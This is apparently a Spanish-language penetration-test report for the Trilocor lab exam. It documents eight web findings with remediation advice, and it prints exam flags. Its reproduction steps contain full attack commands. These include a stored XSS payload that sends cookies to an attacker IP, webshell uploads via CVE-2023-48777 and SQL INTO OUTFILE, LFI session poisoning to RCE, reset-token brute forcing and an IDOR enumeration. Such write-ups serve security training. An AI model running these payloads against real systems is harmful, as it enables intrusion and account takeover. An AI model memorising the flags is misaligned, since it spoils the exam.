# Trilocor — Web Application Security Assessment

**Cliente / Entorno:** Trilocor (laboratorio CWES) **IP:** `10.129.248.61` **Hosts (`/etc/hosts`):** `trilocor.local`, `www.trilocor.local`, `admin.trilocor.local` **Fecha:** Junio 2026 **Alcance:** Seis aplicaciones web independientes (contenedores separados) sobre la misma IP, incluyendo la tienda Trilocor Shop (`:9000`).

> Nota de direccionamiento: la IP de la máquina objetivo cambió entre sesiones del laboratorio (reasignación de DHCP), pero corresponde a un único host. Todas las referencias se normalizan a la IP vigente: `10.129.248.61`.

---

## 1. Resumen ejecutivo

Se evaluaron seis aplicaciones web del entorno Trilocor. Se identificaron **ocho hallazgos**, de los cuales **cinco son de severidad crítica** (cuatro derivan en ejecución remota de código). Las aplicaciones comparten un conjunto de debilidades recurrentes:

- **Validación de entrada dependiente del método HTTP.** En la app HR (8088), los filtros de seguridad se aplican solo a una rama (GET o POST) dejando la otra expuesta — patrón que habilitó tanto el bypass de autenticación como el LFI→RCE.
- **Inyección SQL por concatenación directa** en dos aplicaciones distintas (HR 8088 y Jobs 8080), una de ellas escalada a RCE mediante `INTO OUTFILE`.
- **Control de acceso roto a nivel de objeto (IDOR/BOLA).** En la app Shop (9000), el endpoint de emisión de tokens confía en el `uid`/`username` del cuerpo de la petición en lugar de la sesión, permitiendo suplantar al `administrator`.
- **Gestión de credenciales y sesiones deficiente:** tokens de reset triviales (4 dígitos sin throttling), contraseñas débiles derivadas del username, reutilización de credenciales entre servicios, y cookies de sesión sin `HttpOnly`.
- **Componentes desactualizados:** WordPress con un plugin a medida vulnerable a Stored XSS y Elementor 3.7.7 afectado por CVE-2023-48777 (RCE).

El impacto agregado es el **compromiso total** de múltiples aplicaciones: ejecución de comandos en el servidor, acceso administrativo y toma de control de cuentas.

---

## 2. Tabla de hallazgos

> Criterio de severidad: **Crítica** = ejecución remota de código o bypass total de autenticación; **Alta** = compromiso de una cuenta o acceso administrativo no autorizado mediante una vulnerabilidad o credencial. El Hallazgo 2 incluye además el vector CVSS 3.1 publicado para su CVE.

|#|Hallazgo|Aplicación / Host|Severidad|Resultado|
|---|---|---|---|---|
|1|Stored XSS → robo de sesión (`secure_testimonials`)|WordPress — `www`/`admin`|Alta|Sesión de `web-editor`|
|2|RCE vía importación de plantillas Elementor (CVE-2023-48777)|WordPress — `admin`|Crítica (9.9)|RCE `www-data`|
|3|Authentication Bypass vía SQL Injection|HR Dashboard — `8088`|Crítica|Acceso al dashboard|
|4|LFI → RCE vía Session Poisoning|HR Dashboard — `8088`|Crítica|RCE `www-data`|
|5|Account Takeover vía brute force de reset token|Jobs Portal — `8080`|Alta|Cuenta `r.batty`|
|6|SQL Injection (UNION) → RCE vía `INTO OUTFILE`|Jobs Portal — `8080`|Crítica|RCE `apache`|
|7|Enumeración WP + credencial débil (XML-RPC) → panel admin|PR Admin — `8009`|Alta|Acceso panel `/admin`|
|9|Broken Object Level Authorization (IDOR) en `/api/tokens` → acceso admin|Trilocor Shop — `9000`|Alta|Token + flag de `administrator`|

---

## 2.1 — Flags obtenidas (por tarea del examen)

> El examen consta de varias tareas; algunas comparten cadena de explotación (p. ej. el acceso de la tarea 1 y el RCE de la tarea 2 parten ambos del WordPress). La **tarea 8** (XXE / PR admin) se omitió en esta corrida y queda pendiente; la **tarea 9** (Trilocor Shop) se resolvió y se documenta en el Hallazgo 9.

| Tarea | Objetivo                                      | Hallazgo | Flag                               |
| ----- | --------------------------------------------- | -------- | ---------------------------------- |
| 1     | Acceso al admin dashboard de la web principal | 1        | `b2641186f0add94dc7d7845d82550047` |
| 2     | RCE en la web principal → `.txt` en `/`       | 2        | `ff01bfb24eb5f1746c6bdfba5b7efee3` |
| 3     | Bypass del login del HR dashboard             | 3        | `f94f3cd14bc0b690fe3a437f7becbcd2` |
| 4     | RCE en el HR dashboard → `.txt` en `/`        | 4        | `4527e8cbacb4a6f4023154dfa604bccf` |
| 5     | Acceso al panel admin del Jobs Portal         | 5        | `de0344e95fc7c8346fea9e617438bb73` |
| 6     | RCE en el Jobs Portal → `.txt` en `/`         | 6        | `3d9358f76943c092465963bad922f822` |
| 7     | Acceso al panel PR admin                      | 7        | `8711ea1e4574e9c78f28b696da3e0a39` |
| 8     | PR admin                                      | —        | _(pendiente / omitida)_            |
| 9     | Acceso admin en Trilocor Shop → leer la flag  | 9        | `42972588ec91464a86d31090a4fb994c` |

---

## 3. Reconocimiento general

### 3.1 — Hosts y servidor

```bash
# /etc/hosts
10.129.248.61   trilocor.local www.trilocor.local admin.trilocor.local

# Enumeración de vhosts
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -H "Host: FUZZ.trilocor.local" -u http://10.129.248.61/ -fw 5194 -t 100
# -> admin

# Servidor
curl -Iv http://www.trilocor.local/
# -> Apache/2.4.41 (Ubuntu)
```

### 3.2 — CMS

WordPress 6.0.2 con tema Astra 3.9.2. Plugin relevante: **Elementor Website Builder 3.7.7**. `robots.txt` referencia `wp-admin` y los sitemaps de `www` y `admin`.

### 3.3 — Usuarios enumerados (WordPress)

```
web-admin, web-editor, hr-smith, r.batty, pr-martins,
trilocor.Emerald, trilocor.Shiv, trilocor.Gradin,
trilocor.Vagient, trilocor.Fankle
```

Esta lista alimenta varios de los ataques posteriores (password attack, account takeover, correlación de usuarios entre servicios).

---

## 4. Hallazgos detallados

---

## Hallazgo 1 — Stored XSS → Robo de Sesión (`secure_testimonials`)

**Host:** `www.trilocor.local` (WordPress) — sesión usada en `admin.trilocor.local` **Componente:** plugin a medida `secure_testimonials` (`post-testimonial.php`) **Tipo:** Stored Cross-Site Scripting → secuestro de sesión **Severidad:** Alta

### Resumen

El formulario de testimonios de la home envía a un endpoint del plugin a medida `secure_testimonials` que **no sanitiza** el campo `testimonial`. Un payload `<script>` queda almacenado y se ejecuta en el navegador del revisor (`web-editor`) cuando abre el testimonial. Como las cookies de sesión **no tienen `HttpOnly`**, `document.cookie` las expone y permiten secuestrar la sesión.

### Reproducción

**1. Identificar el endpoint** (en el HTML de la home o vía REST API):

```bash
curl -s 'http://www.trilocor.local/index.php/wp-json/wp/v2/posts' | grep -i 'action='
# -> <form id="contact" action="/wp-content/plugins/secure_testimonials/post-testimonial.php" method="post">
```

**2. Confirmar que el endpoint procesa el envío:**

```bash
curl -i -X POST 'http://www.trilocor.local/wp-content/plugins/secure_testimonials/post-testimonial.php' \
  --data 'name=test&company_title=test&email=test@test.com&testimonial=hola'
# -> HTTP 200 "Thank you! Your testimonial has been received successfully."
```

**3. Confirmar que no sanitiza HTML:**

```bash
curl -X POST 'http://www.trilocor.local/wp-content/plugins/secure_testimonials/post-testimonial.php' \
  --data 'name=test&company_title=test&email=a@a.com&testimonial=<u>x</u>'
# acepta el HTML sin filtrar -> Stored XSS viable
```

**4. Montar el receptor** en la máquina de ataque:

```bash
python3 -m http.server 80
```

**5. Inyectar el payload de robo de cookie:**

```bash
curl -X POST 'http://www.trilocor.local/wp-content/plugins/secure_testimonials/post-testimonial.php' \
  --data-urlencode 'name=Cliente' \
  --data-urlencode 'company_title=ACME' \
  --data-urlencode 'email=a@a.com' \
  --data-urlencode 'testimonial=<script>new Image().src="http://10.10.14.22/hook?c="+document.cookie</script>'
```

**6. Capturar la cookie.** Cuando `web-editor` abre el testimonial, el listener recibe `GET /hook?c=wordpress_logged_in_...=web-editor|...`. Las cookies carecen de `HttpOnly`, por eso `document.cookie` pudo leerlas.

**7. Secuestrar la sesión.** Cargar las cookies (decodificando `%7C` → `|`) con Cookie-Editor sobre `admin.trilocor.local`; al entrar a `/wp-admin/`, WordPress reconoce la sesión como `web-editor` sin pedir contraseña:

- `wordpress_logged_in_828ff7d64a441f8aab6a0310bdcee6a9` = `web-editor|<ts>|<token>|<hmac>`
- `wordpress_828ff7d64a441f8aab6a0310bdcee6a9` = `web-editor|<ts>|<token>|<hmac>`

### Impacto

Secuestro de la sesión de un usuario con rol Editor, que habilita directamente el Hallazgo 2 (RCE vía Elementor).

### Remediación

- Sanitizar/escapar toda entrada del plugin `secure_testimonials` (server-side) antes de almacenarla y al renderizarla.
- Marcar las cookies de sesión como `HttpOnly` y `Secure`.
- Revisar el plugin a medida; idealmente reemplazarlo por uno mantenido.

---

## Hallazgo 2 — RCE vía Importación de Plantillas de Elementor (CVE-2023-48777)

**Host:** `admin.trilocor.local` **Componente:** Elementor Website Builder **3.7.7** **CVE:** CVE-2023-48777 — **CWE-434** — CVSS 3.1 **9.9 (Crítica)** **Privilegio requerido:** autenticado, rol Contributor+ (se cumple con `web-editor`) **Versión corregida:** Elementor ≥ 3.18.2

### Resumen

La función de importación de plantillas procesa `fileData` (Base64) y lo escribe en disco con el nombre de `fileName`. Como `fileName` no valida path traversal, un usuario autenticado (Contributor+) escribe un `.php` arbitrario en una ruta web-accesible y lo ejecuta, logrando RCE como `www-data`.

### Prerrequisito

Sesión con rol Editor, obtenida mediante el **Hallazgo 1** (Stored XSS → cookies de `web-editor`).

### Reproducción

**1. Definir la sesión autenticada:**

```bash
COOKIE='wordpress_logged_in_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C...; wordpress_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C...'
```

**2. Obtener el nonce de Elementor:**

```bash
NONCE=$(curl -s -b "$COOKIE" 'http://admin.trilocor.local/wp-admin/post.php?post=22&action=elementor' \
  | grep -oP '"ajax":\{"url":"[^"]+","nonce":"\K[a-z0-9]+')
echo "Nonce: $NONCE"
```

**3. Preparar el webshell en Base64:**

```bash
PAYLOAD=$(echo -n '<?php system($_GET[0]); ?>' | base64)
```

**4. Subir el webshell por el importador vulnerable** (POST urlencoded; el traversal en `fileName` ubica el archivo en `wp-content/uploads/elementor/tmp/`):

```bash
curl -s -i -b "$COOKIE" 'http://admin.trilocor.local/wp-admin/admin-ajax.php' \
  --data-urlencode 'action=elementor_library_direct_actions' \
  --data-urlencode "_nonce=$NONCE" \
  --data-urlencode 'library_action=import_template' \
  --data-urlencode 'fileName=/../shell.php' \
  --data-urlencode "fileData=$PAYLOAD"
# -> HTTP 500 (señal de éxito: el .php se escribió; el 500 es del parseo posterior)
```

**5. Confirmar RCE:**

```bash
curl 'http://admin.trilocor.local/wp-content/uploads/elementor/tmp/shell.php?0=id'
# -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

El webshell es accesible **sin autenticación** y ejecuta comandos por el parámetro `0`.

### Ajuste del path traversal

|`fileName`|Ruta resultante|
|---|---|
|`/../shell.php`|`wp-content/uploads/elementor/tmp/shell.php`|
|`/../../shell.php`|`wp-content/uploads/elementor/shell.php`|
|`shell.php` (sin traversal)|subdirectorio aleatorio dentro de `tmp/`|

Si una ruta da 404, reintentar la subida y pedir el archivo de inmediato (los temporales pueden eliminarse automáticamente).

### Impacto

Compromiso total del servidor web: lectura de `wp-config.php` y credenciales de BD, reverse shell, y enumeración para escalada local.

### Remediación

- Actualizar Elementor a **≥ 3.18.2**.
- Impedir ejecución de PHP en `wp-content/uploads/` (regla Apache/Nginx).
- Mínimo privilegio sobre qué roles acceden a Elementor.
- Proceso de parcheo periódico de plugins.

### Referencias

CVE-2023-48777 (Wordfence / Patchstack); WPScan `a6b3b14c-f06b-4506-9b88-854f155ebca9`; investigador original Hồng Quân (2023-12-06).

---

## Hallazgo 3 — Authentication Bypass vía SQL Injection (HR Dashboard)

**Host:** `www.trilocor.local:8088` — Apache/2.4.41, PHP **Endpoint:** `/index.php` — **Parámetro:** `username` **Tipo:** SQL Injection → Authentication Bypass — **Severidad:** Crítica **Método efectivo:** GET (no POST)

### Resumen

El login concatena la entrada en la consulta SQL. El filtro de sanitización (bloquea la comilla simple) se aplica **solo a la rama POST**, pero la lógica de autenticación consume `username` también por **GET**, donde no hay filtro. La inyección por query string lo evade y autentica sin credenciales.

**Payload:** `/index.php?username='OR+'a'='a'--+-&password='`

### Oráculo

|Mensaje (`invalid-feedback`)|Significado|
|---|---|
|`Invalid username.`|Bloqueado por el filtro (no llegó al SQL)|
|`Invalid login details.`|Pasó el filtro, llegó al SQL, sin match|
|_(ninguno / redirección)_|Autenticación exitosa|

### Filtro identificado (rama POST)

Bloqueados: `' " # espacio = \ ( ) /` · Permitidos: `-` `` ` `` `| * ;` + alfanuméricos.

### Reproducción

```bash
T="http://www.trilocor.local:8088"

# 1) Confirmar que GET evade el filtro
curl -s "$T/index.php?username=admin%27&password=x" \
  | grep -oE 'Invalid (username|login details)\.'
# -> Invalid login details.  (el quote pasó al SQL)

# 2) Auth bypass por GET
curl -s -i "$T/index.php?username=%27OR+%27a%27=%27a%27--+-&password=%27"

# 3) Sesión + dashboard
curl -s -c /tmp/trilocor.txt \
  "$T/index.php?username=%27OR+%27a%27=%27a%27--+-&password=%27" -o /dev/null
curl -s -b /tmp/trilocor.txt "$T/dashboard.php"
```

### Nota metodológica — Burp vs. navegador

La inyección no pasaba desde Burp pero sí desde la barra del navegador: el navegador URL-encodea automáticamente `'`, espacios y `=`. En Burp hay que aplicar _Convert selection → URL-encode key characters_ sobre esos caracteres.

### Impacto

Bypass completo de la autenticación; acceso al HR Dashboard; inyección confirmada en `username` (extensible a UNION/blind).

### Remediación

Prepared statements; validación uniforme entre métodos; rechazar GET para el login; mensajes de error genéricos; cuenta de BD con privilegios mínimos.

---

## Hallazgo 4 — LFI → RCE vía Session Poisoning (HR Dashboard)

**Host:** `www.trilocor.local:8088` — **Endpoint:** `/dashboard.php` (autenticado) **Parámetro:** `language` — **Severidad:** Crítica — **Método efectivo:** POST **Precondición:** sesión del Hallazgo 3.

### Resumen

`language` se pasa a `include()` sin validación. El filtro de path traversal cubre **solo GET**; por **POST** se evade con el bypass no-recursivo `....//`. Adicionalmente, `language` se persiste sin sanitizar en `$_SESSION['lang']` (serializado a `/var/lib/php/sessions/sess_<ID>`). Escribiendo PHP en la sesión y luego incluyendo ese archivo, PHP lo ejecuta → RCE. Los wrappers remotos (`data://`, filter-chains a `php://temp`) no funcionaron, lo que sugiere `allow_url_include=Off`; por eso el vector efectivo es la inclusión de un archivo local controlado (la sesión).

### Patrón raíz del target

|Vector|Rama con filtro|Rama explotable|
|---|---|---|
|Login (Hallazgo 3)|POST|GET|
|LFI (`language`)|GET|POST|

La validación no debe depender del método de transporte.

### Reproducción

```bash
T="http://www.trilocor.local:8088"
C="$HOME/trilocor_cookie.txt"

# 1) Sesión vía SQLi del login
curl -s -c "$C" "$T/index.php?username=%27OR+%27a%27=%27a%27--+-&password=%27" -o /dev/null
SID=$(grep -oE 'PHPSESSID[[:space:]]+[a-z0-9]+' "$C" | awk '{print $2}')

# 2) Confirmar LFI (POST + bypass ....//)
curl -s -b "$C" -X POST "$T/dashboard.php" \
  --data-urlencode 'language=....//....//....//....//etc/passwd' | grep -a 'root:.*:0:0:'

# 3) Escribir webshell en la sesión
curl -s -b "$C" -X POST "$T/dashboard.php" \
  --data-urlencode 'language=<?php system($_POST["cmd"]); ?>' -o /dev/null

# 4) Incluir sesión y ejecutar
curl -s -b "$C" -X POST "$T/dashboard.php" \
  --data-urlencode "language=....//....//....//....//var/lib/php/sessions/sess_$SID" \
  --data-urlencode 'cmd=id' | grep -a 'uid='
# -> uid=33(www-data)
```

> El `....//` funciona porque el filtro elimina `../` en una sola pasada (no recursivo). El webshell en sesión se **reescribe en cada request con `language`**: escribir e incluir en requests consecutivos, y usar rutas absolutas en `cmd`.

### Impacto

RCE como `www-data`; lectura de archivos arbitrarios; pivote para escalada.

### Remediación

Whitelist cerrada para `language` (no input directo en `include()`); validación uniforme entre métodos; no persistir entrada cruda en `$_SESSION`; `allow_url_include=Off` y `open_basedir` restringido.

---

## Hallazgo 5 — Account Takeover vía Brute Force del Reset Token (Jobs Portal)

**Host:** `trilocor.local:8080` — **Endpoints:** `register/login/forgot/reset.php` **Tipo:** User enumeration + reset token débil sin rate limiting → Account Takeover **Severidad:** Alta — **Cuenta:** `r.batty`

### Resumen

El reset genera un **token de 4 dígitos** (10 000 valores) y `reset.php` **no aplica throttling**. Combinado con enumeración de usuarios (mensajes de login diferenciales), se fuerza el token y se fija una contraseña nueva.

### Cadena

1. Nombre real expuesto en el portal: **Roy Batty**.
2. `./username-anarchy Roy Batty > Roy_Batty_usernames.txt`.
3. Enumeración por oráculo de login → `r.batty` (usuario existente).
4. `forgot.php` → habilita `reset.php?username=r.batty`.
5. Token caracterizado en el form: `maxlength="4"`, "4 Digit Reset Token".

### Reproducción

```bash
T="http://trilocor.local:8080"
SID="<PHPSESSID del forgot.php>"

# Oráculo de error
curl -s -X POST "$T/reset.php" \
  -H 'Content-Type: application/x-www-form-urlencoded' -H "Cookie: PHPSESSID=$SID" \
  -d 'username=r.batty&token=9999&password=Newpass123!&pass_conf=Newpass123!' \
  | grep -i 'token'
# -> <span>Invalid Token.</span>

# Brute force
seq -w 0 9999 > /tmp/pins.txt
ffuf -t 3 -rate 8 -p 0.2-0.6 \
  -u "$T/reset.php" -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' -H "Cookie: PHPSESSID=$SID" \
  -d 'username=r.batty&token=FUZZ&password=Newpass123!&pass_conf=Newpass123!' \
  -w /tmp/pins.txt -fr 'Invalid Token'

# Fijar password con el token hallado
curl -s -X POST "$T/reset.php" \
  -H 'Content-Type: application/x-www-form-urlencoded' -H "Cookie: PHPSESSID=$SID" \
  -d 'username=r.batty&token=<TOKEN>&password=Newpass123!&pass_conf=Newpass123!'
```

> Operativo: rate bajo (banea con volumen); confirmar `Threads: 3` en el banner; el token está atado a la PHPSESSID del `forgot.php`; filtrar por `Invalid Token` (no por "Error", presente en todo el template); `seq -w` para padding de ceros.

### Impacto

Toma de control de cualquier cuenta enumerable, sin credenciales previas.

### Remediación

Tokens fuertes (`random_bytes`, de un solo uso, expiración corta); rate limiting/lockout en `reset.php`; invalidar token tras N fallos; mensajes genéricos; no exponer nombres de empleados.

---

## Hallazgo 6 — SQL Injection (UNION) → RCE vía `INTO OUTFILE` (Jobs Portal)

**Host:** `trilocor.local:8080` — PHP + MySQL — **Endpoint:** `/resumes.php` **Parámetro:** `search` (POST) — **Severidad:** Crítica **Contexto:** `uid=100(apache)` (contenedor) — **Precondición:** sesión del Hallazgo 5.

### Resumen

`search` se concatena en la consulta → inyección UNION-based (6 columnas). La cuenta MySQL posee privilegio `FILE` y `secure_file_priv` no restringe la escritura al webroot (se infiere de que el `INTO OUTFILE` tuvo éxito; no se verificó directamente con `SELECT @@secure_file_priv`), lo que permite escribir un webshell en el webroot → RCE como `apache`.

### Reproducción

```bash
T="http://trilocor.local:8080"
SID="<PHPSESSID autenticada>"

# 1) Confirmar columnas (6)
curl -s -X POST "$T/resumes.php" -H "Cookie: PHPSESSID=$SID" \
  --data-urlencode "search=test' UNION select 1,2,3,4,5,6-- -"

# 2) Confirmar INTO OUTFILE
curl -s -X POST "$T/resumes.php" -H "Cookie: PHPSESSID=$SID" \
  --data-urlencode "search=test' UNION select 1,2,3,'file written successfully',5,6 into outfile '/var/www/public/proof.txt'-- -"
curl -s "$T/proof.txt"   # -> file written successfully

# 3) Escribir webshell
curl -s -X POST "$T/resumes.php" -H "Cookie: PHPSESSID=$SID" \
  --data-urlencode "search=test' UNION select 1,2,3,'<?php system(\$_REQUEST[\"cmd\"]); ?>',5,6 into outfile '/var/www/public/web-shell.php'-- -"

# 4) RCE
curl -s "$T/web-shell.php?cmd=id" -H "Cookie: PHPSESSID=$SID"
# -> uid=100(apache) gid=101(apache) groups=82(www-data),101(apache)
```

> Usar `$_REQUEST['cmd']` **con comillas** (sin comillas: warning en PHP 7, error fatal en PHP 8). El usuario `apache` (uid 100) difiere del `www-data` del 8088: contenedores separados; `entry.sh` en `/` confirma contenedor.

### Impacto

Lectura/escritura de archivos vía SQLi; RCE como `apache`; compromiso de la BD.

### Remediación

Prepared statements; **revocar privilegio `FILE`**; `secure_file_priv` a directorio aislado (nunca el webroot); webroot de solo lectura para MySQL; cuenta de BD con privilegios mínimos.

---

## Hallazgo 7 — Enumeración WP + Credencial Débil (XML-RPC) → Panel Admin (PR Admin)

**Hosts:** `www.trilocor.local` (WordPress) → `www.trilocor.local:8009/admin` **Tipo:** username enumeration + password attack XML-RPC + reutilización de credenciales **Severidad:** Alta — **Credenciales:** `pr-martins` / `martins`

### Resumen

WordPress permite enumeración de usuarios y ataques de contraseña por `xmlrpc.php` (sin throttling). Se obtiene `pr-martins` / `martins`; la credencial **no era útil en WordPress** pero **se reutiliza** en el panel `/admin` del 8009, donde `pr-martins` figura en el equipo.

### Reproducción

```bash
# 1) Descubrir el panel admin (8009)
ffuf -u "http://www.trilocor.local:8009/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,302,401,403 -t 3 -rate 6 -p 0.3-1.0
# -> /admin

# 2) Enumerar usuario
wpscan --url http://www.trilocor.local/ --enumerate u   # -> pr-martins

# 3) Password attack vía XML-RPC
wpscan --url http://www.trilocor.local/ \
  --usernames pr-martins --passwords /ruta/wordlist.txt \
  --password-attack xmlrpc                              # -> pr-martins / martins

# 4) Reutilizar en el panel 8009
#    http://www.trilocor.local:8009/admin  ->  pr-martins / martins
```

> `--password-attack xmlrpc` (método `system.multicall`) es más rápido y elude el throttling de `wp-login.php`. La contraseña `martins` deriva del propio username.

### Impacto

Acceso administrativo al panel 8009 mediante reutilización de una credencial débil de WordPress.

### Remediación

Deshabilitar/limitar XML-RPC con rate limiting; política de contraseñas fuertes; credenciales únicas por servicio; mitigar enumeración de usuarios; MFA en paneles admin.

---

## Hallazgo 9 — Broken Object Level Authorization (IDOR) en emisión de tokens → Acceso admin (Trilocor Shop)

**Host:** `trilocor.local:9000` (Trilocor Shop) — **Endpoint:** `/api/tokens` (POST, JSON) **Parámetro:** `uid` (+ `username`) en el cuerpo de la petición **Tipo:** Broken Object Level Authorization / IDOR — **CWE-639** (Authorization Bypass Through User-Controlled Key), **OWASP API1:2023** **Severidad:** Alta — **Resultado:** token y flag de `administrator` **Precondición:** una cuenta cualquiera registrada (sesión autenticada propia). **Tarea del examen:** flag 9 — _"Try to gain admin access on Trilocor's Shop to read the flag."_

### Resumen

El endpoint `/api/tokens` emite un token (y devuelve la flag asociada) para el usuario **identificado por el `uid` y `username` que vienen en el cuerpo de la petición**, en lugar de derivar la identidad de la sesión autenticada en el servidor. La sesión sirve solo para superar el muro de "estar logueado"; la decisión de _a qué usuario pertenece el token_ se toma con datos controlados por el cliente.

El `uid` es una **referencia directa a objeto** sin control de autorización a nivel de objeto: cambiándolo por el de otra cuenta se obtiene el token de esa cuenta. El servidor sí valida que el par `(uid, username)` corresponda a un usuario real —por eso una `uid` válida con un `username` incorrecto falla—, pero **no** valida que ese par coincida con el usuario de la sesión. Esa validación parcial es la que convierte el ataque en dos pasos: fijar `uid=1` (admin) y **enumerar el `username`** hasta encontrar el que casa con esa `uid`.

### Por qué funciona (raíz)

La autorización a nivel de objeto se delega en un identificador que el atacante controla. El patrón es el mismo antipatrón sistémico del resto del entorno: **confiar en la entrada del cliente para una decisión de seguridad** (acá, la identidad del dueño del recurso). El control correcto —"¿el usuario de _esta sesión_ puede pedir el token de _este `uid`_?"— no existe. Como `uid` es secuencial (el usuario propio es el `3`, el admin es el `1`), el espacio a probar es trivial.

### Oráculo de respuesta

|Cuerpo enviado|Significado|
|---|---|
|`{"uid":"3","username":"test"}`|Par propio válido → token propio (línea base)|
|`{"uid":"1","username":"test"}`|`uid` admin pero `username` no casa → error / _invalid_|
|`{"uid":"1","username":"administrator"}`|Par válido del admin → token + flag de `administrator`|

### Reproducción

```bash
T="http://trilocor.local:9000"         # Trilocor Shop
SID="<PHPSESSID de la sesión propia>"  # cuenta registrada (uid=3, username=test)

# 1) Línea base: observar la petición legítima (vista en Burp)
#    El servidor confía en el uid/username del body, no en la sesión.
curl -s -X POST "$T/api/tokens" \
  -H 'Content-Type: application/json' -H "Cookie: PHPSESSID=$SID" \
  -d '{"uid":"3","username":"test"}'
# -> token propio (uid=3)

# 2) Confirmar el IDOR: cambiar uid sin tocar la sesión
curl -s -X POST "$T/api/tokens" \
  -H 'Content-Type: application/json' -H "Cookie: PHPSESSID=$SID" \
  -d '{"uid":"1","username":"test"}'
# -> error: el par (uid=1, username=test) no existe
#    => el username de uid=1 hay que descubrirlo

# 3) Enumerar el username de uid=1
ffuf -w /usr/share/seclists/Usernames/Names/admin-users.txt \
  -u "$T/api/tokens" -X POST \
  -H 'Content-Type: application/json' -H "Cookie: PHPSESSID=$SID" \
  -d '{"uid":"1","username":"FUZZ"}' \
  -mc 200 -fr 'error|invalid|not found' -t 3 -rate 8
# -> administrator

# 4) Recuperar token + flag del admin
curl -s -X POST "$T/api/tokens" \
  -H 'Content-Type: application/json' -H "Cookie: PHPSESSID=$SID" \
  -d '{"uid":"1","username":"administrator"}'
# -> {"token":"<token de administrator>","flag":"<flag>"}
```

### Nota metodológica — Burp

La petición a `/api/tokens` no aparece navegando la UI; se descubre interceptando el tráfico (POST con cuerpo JSON `{"uid":"3","username":"test"}`). Flujo recomendado: mandar la request a **Repeater**, cambiar `uid` a `1` para confirmar el IDOR, y luego pasarla a **Intruder** marcando `username` como única posición de payload (lista de usernames de admin: `administrator`, `admin`, `root`, `superadmin`, …) hasta que la respuesta cambie de _error_ a token+flag. Verificar que `Content-Type: application/json` se mantenga al enviar desde Intruder.

### Impacto

Suplantación de cualquier usuario por su `uid`, incluido `administrator`: emisión de su token de sesión/API y lectura de datos restringidos (la flag). Con la `uid` secuencial y sin rate limiting, el acceso administrativo es directo desde cualquier cuenta recién creada, sin credenciales del admin.

### Remediación

- Derivar **siempre** la identidad (`uid`/`username`) de la sesión autenticada en el servidor; **nunca** aceptarla del cuerpo de la petición para decisiones de autorización.
- Aplicar control de autorización **a nivel de objeto**: antes de emitir el token, verificar que el `uid` solicitado pertenece al usuario de la sesión (o que la sesión tiene un rol que lo autoriza explícitamente).
- Evitar identificadores secuenciales/enumerables como única referencia de objeto (usar valores no adivinables: UUID), sin que ello sustituya el chequeo de autorización.
- Acotar y monitorear `/api/tokens` con rate limiting para frenar la enumeración; respuestas de error genéricas que no diferencien "uid inexistente" de "username no casa".

---

## 5. Conclusiones

El entorno Trilocor presenta debilidades sistémicas más allá de los fallos individuales. El hilo común es **confiar en la entrada del cliente para una decisión de seguridad**, ya sea el método HTTP, los caracteres de una consulta o la identidad del dueño de un recurso:

1. **Validación dependiente del método HTTP** (Hallazgos 3 y 4) — un antipatrón que debe corregirse centralizando la validación server-side.
2. **Inyección SQL por concatenación** en dos aplicaciones (Hallazgos 3 y 6) — resoluble de raíz con prepared statements.
3. **Control de acceso a nivel de objeto (IDOR/BOLA)** (Hallazgo 9) — la autorización delegada en un identificador (`uid`) controlado por el cliente; misma raíz que los Hallazgos 3 y 4, corregible derivando la identidad de la sesión y validando autorización por objeto.
4. **Gestión de credenciales y sesiones** (Hallazgos 1, 5, 7) — cookies sin `HttpOnly`, tokens débiles, contraseñas adivinables y reutilización entre servicios.
5. **Componentes desactualizados** (Hallazgos 1 y 2) — el parcheo de Elementor y la revisión del plugin a medida eliminan dos vías a RCE.

Prioridad de remediación: los cuatro caminos a RCE (Hallazgos 2, 4, 6 y el potencial del 3) primero, por su impacto de compromiso total; luego el control de acceso a nivel de objeto (Hallazgo 9), el endurecimiento de credenciales/sesiones y la actualización de componentes.